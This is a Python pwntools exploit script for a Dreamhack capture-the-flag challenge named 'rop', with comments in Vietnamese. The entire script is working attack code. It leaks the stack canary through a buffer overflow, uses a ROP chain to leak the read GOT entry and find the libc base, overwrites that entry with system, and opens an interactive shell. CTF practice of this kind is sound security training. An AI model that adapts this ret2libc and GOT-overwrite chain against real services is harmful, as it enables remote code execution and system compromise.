#!/usr/bin/python3

from pwn import *

exe=ELF('./rop')
p=remote('host3.dreamhack.games',12760)
# p=process(exe.path)
libc=ELF('./libc.so.6')
#leak canary 
# payload=b'A'*0x57
# p.sendlineafter(b'Buf: ',payload)
# p.recvuntil(payload)
# canary=u64(b'\x00'+p.recvn(7))
payload = b'A' * 0x39 # buf + 1
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
log.info("leak canary : "+hex(canary))
# thuc hien tim kiem gadget bang ROPgadget
rop_rdi=0x0000000000400853
rop_rsi_r15=0x0000000000400851
ret=0x0000000000400596
read_plt=exe.plt['read']
read_got=exe.got['read']
write_plt=exe.plt['write']
#new payload bypass canary 
#leak read_got address
payload=b'A'*0x38+p64(canary)+0x8*b'B'
#de thuc hien leak read_got address ta thuc hien goi toi ham write(1,read_got,0)
payload+=p64(rop_rdi)+p64(1)#stdout
payload+=p64(rop_rsi_r15)+p64(read_got)+p64(0)
payload+=p64(write_plt)
#thuc hien ghi de dia chi system len read_got ==> khi ta thuc hien goi ham read('/bin/sh')==> system('/bin/sh')
payload+=p64(rop_rdi)+p64(0)
payload+=p64(rop_rsi_r15)+p64(read_got)+p64(0)
payload+=p64(read_plt)

# thay doi read('/bin/sh') to system('/bin/sh')
#address of /bin/sh after system address
payload+=p64(rop_rdi)+p64(read_got+0x8)
payload+=p64(ret)
payload+=p64(read_plt)
p.sendafter(b'Buf: ',payload)
read=u64(p.recvn(6)+b'\x00\x00')
lb=read - libc.sym['read']
system=lb+libc.sym['system']
log.info('read address: '+hex(read))
log.info('libc base address : '+hex(lb))
log.info('system address: '+hex(system))
# p.send(p64(system)+b'/bin/sh\x00')
p.send(p64(system) + b'/bin/sh\x00')
p.interactive()